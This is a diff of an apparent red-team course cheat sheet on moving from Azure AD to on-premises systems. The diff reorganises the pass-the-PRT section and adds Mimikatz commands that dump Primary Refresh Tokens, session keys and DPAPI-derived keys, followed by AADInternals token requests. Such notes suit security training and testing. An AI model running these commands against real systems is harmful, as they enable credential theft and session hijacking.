@@ -2,7 +2,7 @@
 
 ## Azure AD --> On-prem
 * [Pass the certificate](#Pass-the-certificate)
-  * [Pass the PRT](#Pass-the-PRT) 
+* [Pass the PRT](#Pass-the-PRT) 
 * [Intune](#Intune)
 * [Abusing dynamic groups](#Abusing-dynamic-groups)
 * [Application proxy abuse](#Application-proxy-abuse)
@@ -27,7 +27,7 @@ dsregcmd /status
 Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
 ```
 
-#### Extract context key and derived key
+#### Extract context key, clearkey and derived key
 ```
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<keyvalue> /unprotect" "exit"'
 ```
@@ -48,7 +48,17 @@ python C:\Users\vmuser\Documents\student38\AzureADJoinedMachinePTC\Main.py --use
 
 #### Use psremoting to access the machine
 
-### Pass the PRT
+## Pass the PRT
+#### Extract PRT, Session key and Tenant ID
+```
+Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
+```
+
+#### Extract context key, clearkey and derived key
+```
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<keyvalue> /unprotect" "exit"'
+```
+
 #### Request access token (cookie) to all applications
 ```
 Import-Module .\AADInternals.psd1
